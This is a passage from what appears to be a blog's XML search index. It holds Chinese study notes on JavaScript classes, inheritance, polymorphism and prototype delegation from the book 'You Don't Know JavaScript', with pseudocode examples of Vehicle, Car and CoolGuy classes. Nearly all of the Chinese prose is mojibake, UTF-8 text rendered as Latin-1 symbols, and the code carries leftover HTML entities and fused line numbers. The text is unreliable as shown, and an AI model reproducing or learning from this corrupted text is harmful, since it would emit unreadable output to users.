æ­¤è¯­è¨€ä¸­æ‰€æœ‰çš„å¯¹è±¡éƒ½å¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚ å…³è”ä¸¤ä¸ªå¯¹è±¡æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ new å…³é”®å­—è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œåœ¨è°ƒç”¨çš„4ä¸ªæ­¥éª¤ä¼šåˆ›å»ºä¸€ä¸ªå…³è”å…¶ä»–å¯¹è±¡çš„æ–°å¯¹è±¡ã€‚ ä½¿ç”¨ new è°ƒç”¨å‡½æ•°ä¼šæŠŠæ–°å¯¹è±¡çš„ .prototype å±žæ€§åˆ°â€œå…¶ä»–å¯¹è±¡â€ï¼Œå¸¦ new çš„å‡½æ•°è°ƒç”¨é€šå¸¸è¢«ç§°ä¸º â€œæž„é€ å‡½æ•°å—²ç”¨â€ï¼Œå°½ç®¡å®ƒä»¬å®žé™…ä¸Šå’Œä¼ ç»Ÿçš„é¢å‘ç±»è¯­è¨€ä¸­çš„ç±»æž„é€ å‡½æ•°ä¸ä¸€æ ·ã€‚ è™½ç„¶è¿™äº› JavaScript æœºåˆ¶å’Œä¼ ç»Ÿé¢å‘ç±»çš„è¯­è¨€ä¸­çš„â€œç±»åˆå§‹åŒ–â€å’Œâ€œç±»ç»§æ‰¿â€å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯ æœºåˆ¶æœ‰ä¸€ä¸ªæ ¸å¿ƒåŒºåˆ«ï¼Œå°±æ˜¯ä¸ä¼šè¿›è¡Œèµ‹å€¼ï¼Œå¯¹è±¡ä¹‹é—´æ˜¯é€šè¿‡å†…éƒ¨çš„ [[Prototype]] é“¾è¿›è¡Œå…³è”çš„ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œâ€œå§”æ‰˜â€æ˜¯ä¸€ä¸ªæ›´åˆé€‚çš„æœ¯è¯­ï¼Œå› ä¸ºå¯¹è±¡ä¹‹é—´çš„å…³ç³»ä¸æ˜¯å¤åˆ¶è€Œæ˜¯å§”æ‰˜ã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ä½ ä¸çŸ¥é“çš„JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”æ··åˆå¯¹è±¡â€œç±»â€]]></title>
    <url>%2F2019-01-21-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E6%B7%B7%E5%90%88%E5%AF%B9%E8%B1%A1%E2%80%9C%E7%B1%BB%E2%80%9D.html</url>
    <content type="text"><![CDATA[è¿™ä¸ªç³»åˆ—çš„ä½œå“æ˜¯ä¸Šä¸€æ¬¡å½“å½“ç½‘æœ‰æ´»åŠ¨ä¹°çš„ï¼Œè®°å¾—æ˜¯ä¸Šä¸€å¹´ä¹æœˆä»½å¼€å­¦å­£çš„æ—¶å€™äº†ã€‚åŽé¢ä¸€ç›´æœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œæˆ–è€…è‡ªèº«ä¸€äº›å› ç´ ï¼Œè¿Ÿè¿Ÿæ²¡æœ‰å¼€å°è¿™æœ¬ä¹¦ã€‚ä»Šå¤©ç«‹ä¸‹ä¸€ä¸ª flagï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸¤ä¸ªæœˆå†…çœ‹å®Œå¹¶è®°å½•è¿™ä¸ªç³»åˆ—çš„ä¸‰æœ¬ä¹¦ï¼Œä¿æŒå­¦ä¹ çš„æ¿€æƒ…ï¼Œä¸æ–­å¼¥è¡¥è‡ªå·±çš„åŸºç¡€ä¸å¤Ÿæ‰Žå®žçš„ç¼ºç‚¹ã€‚ ä½œè€…çš„github ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ï¼Œè‡ªå·±æœã€‚ ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”æ··åˆå¯¹è±¡â€œç±»â€ä¸Šä¸€ç« è®²äº†å¯¹è±¡ï¼Œä¸‹é¢ä»‹ç»å’Œç±»ç›¸å…³çš„å¯¹è±¡ç¼–ç¨‹ï¼Œåœ¨ç ”ç©¶ç±»çš„å…·ä½“æœºåˆ¶ä¹‹å‰ï¼Œå…ˆä»‹ç»é¢å‘ç±»çš„è®¾è®¡æ¨¡å¼ï¼šå®žä¾‹åŒ–ï¼ˆinstantitationï¼‰ã€ç»§æ‰¿ï¼ˆinheritanceï¼‰å’Œï¼ˆç›¸å¯¹ï¼‰å¤šæ€ï¼ˆpolymorphismï¼‰ å¯ä»¥çœ‹åˆ°ï¼Œè¿™äº›æ¦‚å¿µå®žé™…ä¸Šæ— æ³•ç›´æŽ¥å¯¹åº”åˆ° JavaScript çš„å¯¹è±¡æœºåˆ¶ï¼Œå› ä¸ºä¼šä»‹ç»è®¸å¤š JavaScript å¼€å‘è€…æ‰€ä½¿ç”¨çš„è§£å†³æ–¹æ³•ï¼ˆæ¯”å¦‚æ··å…¥ï¼Œmixinï¼‰ ç±»ç†è®ºç±»/ç»§æ‰¿æè¿°äº†ä¸€ç§ä»£ç çš„ç»„ç»‡ç»“æž„å½¢å¼â€”â€”ä¸€ç§åœ¨è½¯ä»¶ä¸­å¯¹çœŸå®žä¸–ç•Œä¸­é—®é¢˜é¢†åŸŸçš„å»ºæ¨¡æ–¹æ³•ã€‚ é¢å‘å¯¹è±¡ç¼–ç¨‹å¼ºè°ƒçš„æ˜¯æ•°æ®å’Œæ“ä½œæ•°æ®çš„è¡Œä¸ºæœ¬è´¨ä¸Šæ˜¯äº’ç›¸å…³è”çš„ï¼ˆå½“ç„¶ï¼Œä¸åŒçš„æ•°æ®æœ‰ä¸åŒçš„è¡Œä¸ºï¼‰ï¼Œå› ä¸ºå¥½çš„è®¾è®¡å°±æ˜¯æŠŠæ•°æ®ä»¥åŠå’Œå®ƒç›¸å…³çš„è¡Œä¸ºæ‰“åŒ…ï¼ˆæˆ–è€…è¯´å°è£…èµ·æ¥ï¼‰ã€‚è¿™åœ¨æ­£å¼çš„è®¡ç®—æœºç§‘å­¦ä¸­æœ‰æ—¶è¢«ç§°ä¸ºæ•°æ®ç»“æž„ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªå•è¯æˆ–è€…æ˜¯çŸ­è¯­çš„ä¸€ä¸²å­—ç¬¦é€šå¸¸è¢«ç§°ä¸º å­—ç¬¦ä¸²ï¼Œå­—ç¬¦å°±æ˜¯æ•°æ®ï¼Œä½†æ˜¯ä½ å…³å¿ƒçš„å¾€å¾€ä¸æ˜¯æ•°æ®æ˜¯ä»€ä¹ˆï¼Œè€Œæ˜¯å¯ä»¥å¯¹æ•°æ®åšä»€ä¹ˆï¼Œæ‰€ä»¥å¯ä»¥åº”ç”¨åœ¨è¿™ç§æ•°æ®ä¸Šçš„è¡Œä¸ºï¼ˆè®¡ç®—é•¿åº¦ã€æ·»åŠ æ•°æ®ã€æœç´¢ç­‰ç­‰ï¼‰éƒ½è¢«è®¾è®¡æˆäº† String ç±»çš„æ–¹æ³•ã€‚ æ‰€æœ‰å­—ç¬¦ä¸²éƒ½æ˜¯ String ç±»çš„ä¸€ä¸ªå®žä¾‹ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä¸€ä¸ªåŒ…è£¹ï¼ŒåŒ…å«å­—ç¬¦æ•°æ®å’Œæˆ‘ä»¬å¯ä»¥åº”ç”¨åœ¨æ•°æ®ä¸Šçš„å‡½æ•°ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ç±»å¯¹æ•°æ®ç»“æž„è¿›è¡Œåˆ†ç±»ï¼Œå¯ä»¥æŠŠä»»æ„æ•°æ®ç»“æž„çœ‹åšèŒƒå›´æ›´å¹¿çš„å®šä¹‰çš„ä¸€ç§ç‰¹ä¾‹ã€‚â€œæ±½è½¦â€å¯ä»¥è¢«å½“åšæ˜¯ â€œäº¤é€šå·¥å…·â€çš„ä¸€ç§ç‰¹ä¾‹ï¼ŒåŽè€…æ˜¯æ›´å¹¿æ³›çš„ç±»ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è½¯ä»¶ä¸­å®šä¹‰ä¸€ä¸ª Vehicle ç±» å’Œ ä¸€ä¸ª Car ç±»æ¥å¯¹è¿™ç§å…³ç³»è¿›è¡Œå»ºæ¨¡ã€‚ Vehicle çš„å®šä¹‰å¯èƒ½åŒ…å«ç”±æŽ¨è¿›å™¨ï¼ˆæ¯”å¦‚å¼•æ“Žï¼‰ã€è½½äººèƒ½åŠ›ç­‰ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ Vehicle çš„è¡Œä¸ºï¼Œæˆ‘ä»¬åœ¨ Vehicle ä¸­å®šä¹‰çš„æ˜¯ï¼ˆå‡ ä¹Žï¼‰æ‰€æœ‰ç±»åž‹çš„äº¤é€šå·¥å…·ï¼ˆé£žæœºã€ç«è½¦å’Œæ±½è½¦ï¼‰éƒ½åŒ…å«çš„ä¸œè¥¿ã€‚ åœ¨è½¯ä»¶ä¸­ï¼Œå¯¹ä¸åŒäº¤é€šå·¥å…·é‡å¤å®šä¹‰ â€œè½½äººåŠŸèƒ½â€æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œç›¸åï¼Œæˆ‘ä»¬åªè¦åœ¨ Vehicle ä¸­å®šä¹‰ä¸€æ¬¡ã€‚å®šä¹‰ Car æ—¶ï¼Œåªè¦å£°æ˜Žå®ƒç»§æ‰¿ï¼ˆæ²¡æœ‰æ‰©å±•ï¼‰äº† Vehicle è¿™ä¸ªåŸºæœ¬å®šä¹‰å°±å¯ä»¥äº†ï¼ŒCar çš„å®šä¹‰å°±æ˜¯å¯¹é€šç”¨ Vehicle å®šä¹‰çš„ç‰¹æ®ŠåŒ–ã€‚ è™½ç„¶ Vehicle å’Œ Car ä¼šå®šä¹‰ç›¸åŒçš„æ–¹æ³•ï¼Œä½†æ˜¯å®žä¾‹ä¸­çš„æ•°æ®å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œæ¯”å¦‚æ¯è¾†æ±½è½¦ç‹¬ä¸€æ— äºŒçš„ VINï¼ˆæ±½è½¦è¯†åˆ«ç ï¼‰ç­‰ç­‰ã€‚ è¿™å°±æ˜¯ç±»ã€ç»§æ‰¿å’Œå®žä¾‹åŒ–ã€‚ ç±»çš„å¦ä¸€ä¸ªæ¦‚å¿µæ˜¯å¤šæ€ï¼Œè¿™æ¦‚å¿µæ˜¯è¯´çˆ¶ç±»çš„é€šç”¨è¡Œä¸ºå¯ä»¥è¢«å­ç±»ç”¨æ›´ç‰¹æ®Šçš„è¡Œä¸ºé‡å†™ã€‚å®žé™…ä¸Šï¼Œç›¸å¯¹å¤šæ€æ€§è¿è¡Œæˆ‘ä»¬ä»Žé‡å†™è¡Œä¸ºä¸­å¼•ç”¨åŸºç¡€è¡Œä¸ºã€‚ ç±»ç†è®ºå¼ºçƒˆå»ºè®®çˆ¶ç±»å’Œå­ç±»ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•åæ¥è¡¨ç¤ºç‰¹å®šçš„è¡Œä¸ºï¼Œä»Žè€Œè®©å­ç±»é‡å†™çˆ¶ç±»ï¼Œæˆ‘ä»¬ä¹‹åŽä¼šçœ‹åˆ°ï¼Œåœ¨ JavaScript ä»£ç ä¸­è¿™æ ·åšä¼šé™ä½Žä»£ç çš„å¯è¯»æ€§å’Œå¥å£®æ€§ã€‚ â€œç±»â€ çš„è®¾è®¡æ¨¡å¼å¦‚æžœä¹‹å‰æ²¡æœ‰æŠŠç±»å½“åšè®¾è®¡æ¨¡å¼æ¥çœ‹å¾…ï¼Œæˆ‘ä»¬å¯èƒ½è®¨è®ºæ¯”è¾ƒå¤šæ˜¯é¢å‘å¯¹è±¡è®¾è®¡æ¨¡å¼ã€‚ä»Žè¿™ä¸ªè§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å°±æ˜¯åœ¨ï¼ˆä½Žçº§ï¼‰é¢å‘å¯¹è±¡ç±»çš„åŸºç¡€ä¸Šå®žçŽ°äº†æ‰€æœ‰ï¼ˆé«˜çº§ï¼‰çš„è®¾è®¡æ¨¡å¼ï¼Œä¼¼ä¹Žé¢å‘å¯¹è±¡å°±æ˜¯ä¼˜ç§€ä»£ç çš„åŸºç¡€ã€‚ è¿‡ç¨‹åŒ–ç¼–ç¨‹ï¼Œè¿™ç§ä»£ç åªåŒ…å«è¿‡ç¨‹ï¼ˆå‡½æ•°ï¼‰è°ƒç”¨ï¼Œæ²¡æœ‰é«˜å±‚çš„æŠ½è±¡ã€‚ JavaScript ä¸­çš„â€œç±»â€JavaScript åœ¨å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´å†…ï¼Œåªæœ‰ä¸€äº›è¿‘ä¼¼ç±»çš„è¯­æ³•å…ƒç´ ï¼ˆnew å’Œ instanceofï¼‰ï¼Œä¸è¿‡åŽé¢ ES6 ä¸­å¢žåŠ äº†ä¸€ä¸ªå…ƒç´ ï¼Œæ¯”å¦‚ class å…³é”®å­— è¿™ä¸ªæ˜¯ä¸æ˜¯æ„å‘³ç€ JavaScript ä¸­å®žé™…ä¸Šæœ‰ç±»å‘¢ï¼Ÿç®€å•æ¥è¯´ï¼šä¸æ˜¯ã€‚ ç”±äºŽç±»æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç”¨ä¸€äº›æ–¹æ³•è¿‘ä¼¼å®žçŽ°ç±»çš„åŠŸèƒ½ã€‚ä¸ºäº†æ»¡è¶³å¯¹äºŽç±»è®¾è®¡æ¨¡å¼çš„æœ€æ™®ééœ€æ±‚ï¼ŒJavaScript æä¾›äº†ä¸€äº›è¿‘ä¼¼ç±»çš„è¯­æ³•ã€‚è™½ç„¶æœ‰è¿‘ä¼¼ç±»çš„è¯­æ³•ï¼Œä½†æ˜¯ JavaScript çš„æœºåˆ¶ä¼¼ä¹Žä¸€ç›´åœ¨é˜»æ­¢ä½ ä½¿ç”¨ç±»è®¾è®¡æ¨¡å¼ã€‚åœ¨è¿‘ä¼¼ç±»çš„è¡¨è±¡ä¹‹ä¸‹ï¼ŒJavaScript çš„æœºåˆ¶å…¶å®žå’Œç±»å®Œå…¨ä¸åŒã€‚è¯­æ³•ç³–å’Œï¼ˆå¹¿æ³›ä½¿ç”¨çš„ï¼‰JavaScript â€œç±»â€åº“è¯•å›¾æŽ©ç›–è¿™ä¸ªçŽ°å®žï¼Œä½†æ˜¯ä½ è¿Ÿæ—©ä¼šé¢å¯¹å®ƒï¼šå…¶ä»–è¯­æ³•ä¸­çš„ç±»å’Œ JavaScript ä¸­çš„ â€œç±»â€å¹¶ä¸ä¸€æ ·ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œåœ¨è½¯ä»¶è®¾è®¡ä¸­ç±»æ˜¯ä¸€ç§å¯é€‰çš„æ¨¡å¼ï¼Œéœ€è¦å†³å®šæ˜¯å¦åœ¨ JavaScript ä¸­ä½¿ç”¨å®ƒã€‚ ç±»çš„æœºåˆ¶åœ¨è®¸å¤šé¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œâ€œæ ‡å‡†åº“â€ä¼šæä¾› Stack ç±»ï¼Œå®ƒæ˜¯ä¸€ç§ â€œæ ˆâ€æ•°æ®ç»“æž„ï¼ˆæ”¯æŒåŽ‹å…¥ã€å¼¹å‡ºç­‰ç­‰ï¼‰ã€‚Stack ç±»å†…éƒ¨ä¼šæœ‰ä¸€äº›å˜é‡æ¥å­˜å‚¨æ•°æ®ï¼ŒåŒæ—¶æä¾›ä¸€äº›å…±æœ‰çš„å¯è®¿é—®è¡Œä¸ºï¼ˆâ€œæ–¹æ³•â€ï¼‰ï¼Œä»Žè€Œè®©ä½ çš„ä»£ç å¯ä»¥å’Œï¼ˆéšè—çš„ï¼‰æ•°æ®è¿›è¡Œäº¤äº’ï¼ˆæ¯”å¦‚æ·»åŠ ã€åˆ é™¤æ•°æ®ï¼‰ã€‚ ä½†æ˜¯åœ¨è¿™äº›è¯­è¨€ä¸­ï¼Œå®žé™…ä¸Šå¹¶ä¸æ˜¯ç›´æŽ¥æ“ä½œ Stack ï¼ˆé™¤éžåˆ›å»ºä¸€ä¸ªé™æ€ç±»æˆå‘˜å¼•ç”¨ï¼‰ã€‚Stack ç±»ä»…ä»…æ˜¯ä¸€ä¸ªæŠ½è±¡çš„è¡¨ç¤ºï¼Œå®ƒæè¿°äº†æ‰€æœ‰â€œæ ˆâ€éœ€è¦åšçš„äº‹ï¼Œä½†æ˜¯å®ƒæœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªâ€œæ ˆâ€ï¼Œä½ å¿…é¡»å…ˆå®žä¾‹åŒ– Stack ç±»ç„¶åŽæ‰èƒ½å¯¹å®ƒè¿›è¡Œæ“ä½œã€‚ å»ºé€ â€œç±»â€å’Œâ€œå®žä¾‹â€çš„æ¦‚å¿µæ¥æºäºŽæˆ¿å±‹å»ºé€ ã€‚ å»ºç­‘å¸ˆä¼šè§„åˆ’å‡ºä¸€ä¸ªå»ºç­‘çš„æ‰€æœ‰ç‰¹æ€§,å®½é«˜ææ–™ç­‰ç­‰ï¼Œä½†æ˜¯å®ƒä¸åœ¨æ„å»ºç­‘ä¼šè¢«å»ºé€ åœ¨å“ªé‡Œï¼Œä¹Ÿä¸å…³å¿ƒæ•°é‡ã€‚ä¹Ÿä¸å…³å¿ƒå»ºç­‘å†…çš„å†…å®¹ï¼Œåªå…³å¿ƒç”¨ä»€ä¹ˆç»“æž„æ¥å®¹çº³å®ƒä»¬ã€‚ å»ºç­‘å·¥äººä¼šæŒ‰ç…§å»ºé€ è“å›¾å¤åˆ¶åˆ°çŽ°å®žä¸–ç•Œä¸­çš„å»ºç­‘ä¸­ã€‚å»ºç­‘å’Œè“å›¾ä¹‹é—´çš„å…³ç³»æ˜¯é—´æŽ¥çš„ï¼Œä¸€ä¸ªç±»å°±æ˜¯ä¸€å¼ è“å›¾ï¼Œä¸ºäº†èŽ·å¾—çœŸæ­£å¯ä»¥äº¤äº’çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¿…é¡»æŒ‰ç…§ç±»æ¥å»ºé€ ï¼ˆå®žä¾‹åŒ–ï¼‰ä¸€ä¸ªä¸œè¥¿ï¼Œè¿™ä¸ªä¸œè¥¿é€šå¸¸è¢«ç§°ä¸ºå®žä¾‹ï¼Œæœ‰éœ€è¦çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥åœ¨å®žåŠ›ä¸Šè°ƒç”¨æ–¹æ³•å¹¶è®¿é—®å…¶æ‰€æœ‰å…±æœ‰çš„æ•°æ®å±žæ€§ã€‚è¿™ä¸ªå¯¹è±¡å°±æ˜¯ç±»ä¸­æè¿°çš„æ‰€æœ‰ç‰¹æ€§çš„ä¸€ä»½å‰¯æœ¬ã€‚ æž„é€ å‡½æ•°ç±»å®žä¾‹æ˜¯ç”±ä¸€ä¸ªç‰¹æ®Šçš„ç±»æ–¹æ³•æž„é€ çš„ï¼Œè¿™ä¸ªæ–¹æ³•åé€šå¸¸å’Œç±»åç›¸åŒï¼Œè¢«ç§°ä¸ºæž„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä»»åŠ¡å°±æ˜¯åˆå§‹åŒ–å®žä¾‹éœ€è¦çš„æ‰€æœ‰æ¶ˆæ¯ï¼ˆçŠ¶æ€ï¼‰ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œæ€è€ƒå…³äºŽç±»çš„ä¼ªä»£ç ï¼š 12345678910class CoolGuy&#123; spcialTrick = nothing CoolGuy(trick)&#123; spcialTrick = trick &#125; showOff()&#123; output(&apos;Here is my trick:&apos;,spcialTrick); &#125;&#125; æˆ‘ä»¬å¯ä»¥è°ƒç”¨ç±»æž„é€ å‡½æ•°æ¥ç”Ÿæˆä¸€ä¸ª CoolGuy å®žä¾‹ï¼š 12Joe = new CoolGuy('jumping rope');Joe.showOff(); // Here is my trick:jumping rope æ³¨æ„ï¼šGoolGuy ç±»ä¸­æœ‰ä¸€ä¸ª CoolGuy æž„é€ å‡½æ•°ï¼Œæ‰§è¡Œ new CoolGuy() æ—¶å®žé™…ä¸Šè°ƒç”¨çš„å°±æ˜¯å®ƒã€‚æž„é€ å‡½æ•°ä¼šè¿”å›žä¸€ä¸ªå¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯ç±»çš„ä¸€ä¸ªå®žä¾‹ï¼‰ï¼Œä¹‹åŽæˆ‘ä»¬åœ¨è¿™ä¸ªå¯¹è±¡ä¸Šè°ƒç”¨ showOff() æ–¹æ³•ï¼Œæ¥è¾“å‡ºæŒ‡å®š CoolGuy çš„ç‰¹é•¿ã€‚ ç±»æž„é€ å‡½æ•°å±žäºŽç±»ï¼Œè€Œä¸”é€šå¸¸å’Œç±»åŒåï¼Œæ­¤å¤–ï¼Œæž„é€ å‡½æ•°å¤§å¤šæ•°éœ€è¦ç”¨ new æ¥è°ƒç”¨ï¼Œè¿™æ ·è¯­è¨€å¼•æ“Žæ‰çŸ¥é“ä½ æƒ³è¦æž„é€ ä¸€ä¸ªæ–°çš„ç±»å®žä¾‹ã€‚ ç±»çš„ç»§æ‰¿åœ¨é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œå¯ä»¥å…ˆå®šä¹‰ä¸€ä¸ªç±»ï¼Œç„¶åŽå®šä¹‰ä¸€ä¸ªç»§æ‰¿å‰è€…çš„ç±»ã€‚ åŽè€…é€šå¸¸è¢«ç§°ä¸ºâ€œå­ç±»â€ï¼Œå‰è€…é€šå¸¸è¢«ç§°ä¸ºâ€œçˆ¶ç±»â€ã€‚è¿™äº›æœ¯è¯­=æ˜¾ç„¶æ˜¯ç±»æ¯”çˆ¶æ¯å’Œå­©å­ï¼Œä¸è¿‡åœ¨æ„æ€ä¸Šç¨æœ‰æ‰©å±•ã€‚ åŒç†ï¼Œå®šä¹‰å¥½ä¸€ä¸ªå­ç±»ä¹‹åŽï¼Œç›¸å¯¹äºŽçˆ¶ç±»æ¥è¯´å®ƒå°±æ˜¯ä¸€ä¸ªç‹¬ç«‹å¹¶ä¸”å®Œå…¨ä¸åŒçš„ç±»ï¼Œå­ç±»ä¼šåŒ…å«çˆ¶ç±»è¡Œä¸ºçš„åŽŸå§‹å‰¯æœ¬ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥é‡å†™æ‰€æœ‰ç»§æ‰¿çš„è¡Œä¸ºç”šè‡³å®šä¹‰æ–°è¡Œä¸ºã€‚ éžå¸¸é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘ä»¬è®¨è®ºçš„çˆ¶ç±»å’Œå­ç±»å¹¶ä¸æ˜¯å®žä¾‹ï¼Œçˆ¶ç±»å’Œå­ç±»çš„æ¯”å–»å®¹æ˜“é€ æˆä¸€äº›è¯¯è§£ï¼Œå®žé™…ä¸Šæˆ‘ä»¬åº”å½“æŠŠçˆ¶ç±»å’Œå­ç±»ç§°ä¸ºçˆ¶ç±» DNA å’Œ å­ç±» DNA ï¼Œæˆ‘ä»¬æ ¹æ®è¿™äº› DNA æ¥åˆ›å»ºä¸€ä¸ªäººï¼Œç„¶åŽæ‰èƒ½å’Œä»–è¿›è¡Œæ²Ÿé€šã€‚ Vehicle å’Œ Car ç±»ï¼Œæ€è€ƒä¸‹é¢å…³äºŽç±»ç»§æ‰¿çš„ä¼ªä»£ç ï¼š 123456789101112131415161718192021222324252627class Vehicle &#123; engines = 1 ignition()&#123; output(&quot;Turning on my engine.&quot;) &#125; drive()&#123; ignition(); output(&quot;Steering and moving forward!&quot;) &#125;&#125;class Car inherits Vehicle &#123; wheels = 4 drive()&#123; inherited:drive() output(&quot;Rolling on all&quot;,wheels,&quot;wheels&quot;) &#125;&#125;class SpeedBoat inherits Vehicle &#123; engines = 2 ignition()&#123; output(&quot;Turning on my&quot;,engines, &quot;engine.&quot;) &#125; pilot()&#123; inherited:drive() output(&quot;Speeding through the water with ease!&quot;) &#125;&#125; é€šè¿‡å®šä¹‰ Vehicle ç±»æ¥å‡è®¾ä¸€ç§å‘åŠ¨æœºã€ä¸€ç§ç‚¹ç«æ–¹å¼ã€ä¸€ç§é©¾é©¶æ–¹æ³•ï¼Œä½†æ˜¯ä¸å¯ä»¥åˆ¶é€ ä¸€ä¸ªé€šç”¨çš„â€œäº¤é€šåŠŸèƒ½â€ï¼Œå› ä¸ºç±»åªæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µã€‚ å®šä¹‰äº†ä¸¤ç±»å…·ä½“çš„äº¤é€šå·¥å…·ï¼ŒCar å’Œ SpeedBoatï¼Œå®ƒä»¬éƒ½ä»Ž Vehicle ç»§æ‰¿äº†é€šç”¨çš„ç‰¹æ€§å¹¶æ ¹æ®è‡ªèº«ç±»åˆ«ä¿®æ”¹äº†æŸäº›ç‰¹æ€§ï¼Œæ±½è½¦éœ€è¦å››ä¸ªè½®å­ï¼Œå¿«è‰‡éœ€è¦ä¸¤ä¸ªå‘åŠ¨æœºã€‚å› æ­¤ï¼Œå®ƒå¿…é¡»å¯åŠ¨ä¸¤ä¸ªå‘é€æœºçš„ç‚¹ç«è£…ç½®ã€‚ å¤šæ€Car é‡å†™äº†ç»§æ‰¿è‡ªçˆ¶ç±»çš„ drive() æ–¹æ³•ï¼Œä½†æ˜¯ä¹‹åŽ Car è°ƒç”¨ inherited:drive() æ–¹æ³•ï¼Œè¿™è¡¨æ˜Žäº†Car å¯ä»¥ç»§æ‰¿æ¥è‡ªçˆ¶ç±»çš„åŽŸå§‹ drive()æ–¹æ³•ã€‚å¿«è‰‡çš„ pilot() æ–¹æ³•åŒæ ·å¼•ç”¨äº†åŽŸå§‹çš„ drive() æ–¹æ³•ã€‚ è¿™ä¸ªæŠ€æœ¯è¢«ç§°ä¸ºå¤šæ€æˆ–è€…è™šæ‹Ÿå¤šæ€ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ›´æ°å½“çš„è¯´æ³•æ˜¯ç›¸å¯¹å¤šæ€ã€‚ å¤šæ€æ˜¯ä¸€ä¸ªéžå¸¸å¹¿æ³›çš„è¯é¢˜ï¼Œæˆ‘ä»¬çŽ°åœ¨æ‰€è¯´çš„â€œç›¸å¯¹â€å¤šæ€åªæ˜¯ä¸€ä¸ªæ–¹é¢ï¼šä»»ä½•æ–¹æ³•éƒ½å¯ä»¥å¼•ç”¨ç»§æ‰¿å±‚æ¬¡ä¸­é«˜å±‚çš„æ–¹æ³•ï¼ˆæ— è®ºé«˜å±‚æ–¹æ³•åå’Œå½“å‰æ–¹æ³•åæ˜¯å¦ç›¸åŒï¼‰ã€‚ä¹‹æ‰€ä»¥è¯´â€œç›¸å¯¹â€æ˜¯å› ä¸ºæˆ‘ä»¬å¹¶ä¸ä¼šå®šä¹‰æƒ³è¦è®¿é—®çš„ç»å¯¹ç»§æ‰¿å±‚æ¬¡ï¼ˆç±»ï¼‰ï¼Œè€Œæ˜¯ä½¿ç”¨ç›¸å¯¹å¼•ç”¨â€œæŸ¥æ‰¾ä¸Šä¸€å±‚â€ã€‚ åœ¨è®¸å¤šè¯­è¨€ä¸­å¯ä»¥ä½¿ç”¨ super ä»£æ›¿ä¸Šé¢ä¾‹å­ä¸­çš„ inherited å®ƒçš„å«ä¹‰æ˜¯â€œè¶…ç±»â€ï¼ˆsuperclassï¼‰ï¼Œè¡¨ç¤ºå½“å‰çš„ç±»çš„çˆ¶ç±»/ç¥–å…ˆç±»ã€‚ å¤šæ€çš„å¦ä¸€ä¸ªæ–¹é¢æ˜¯ï¼Œåœ¨ç»§æ‰¿é“¾çš„ä¸åŒå±‚æ¬¡ä¸­ä¸€ä¸ªæ–¹æ³•åå¯ä»¥è¢«å¤šæ¬¡å®šä¹‰ï¼Œå½“è°ƒç”¨æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„å®šä¹‰ã€‚åœ¨ä¹‹å‰çš„ä»£ç ä¸­å°±æœ‰è¿™æ ·çš„ä¸¤ä¸ªä¾‹å­ï¼šdrive è¢«å®šä¹‰åœ¨ Vehicle å’Œ Car ä¸­ï¼Œignition è¢«å®šä¹‰åœ¨ Vehicle å’Œ SpeedBoat ä¸­ã€‚ åœ¨ä¼ ç»Ÿçš„é¢å‘ç±»çš„è¯­è¨€ä¸­çš„ super è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯ä»Žå­ç±»çš„æž„é€ å‡½æ•°ä¸­é€šè¿‡ super å¯ä»¥ç›´æŽ¥è°ƒç”¨çˆ¶ç±»çš„æž„é€ å‡½æ•°ã€‚é€šå¸¸æ¥è¯´è¿™æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚å› ä¸ºå¯¹äºŽçœŸæ­£çš„ç±»æ¥è¯´ï¼Œæž„é€ å‡½æ•°æ˜¯å±žäºŽç±»çš„ï¼Œç„¶åŽåœ¨ JavaScript ä¸­æ°å¥½ç›¸åâ€”â€”å®žé™…ä¸Šâ€œç±»â€æ˜¯å±žäºŽæž„é€ å‡½æ•°çš„ï¼ˆç±»ä¼¼ Foo.prototype..è¿™æ ·çš„ç±»åž‹å¼•ç”¨ï¼‰ã€‚ç”±äºŽ JavaScript ä¸­çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»åªå­˜åœ¨äºŽä¸¤è€…æž„é€ å‡½æ•°å¯¹åº”çš„ .prototype 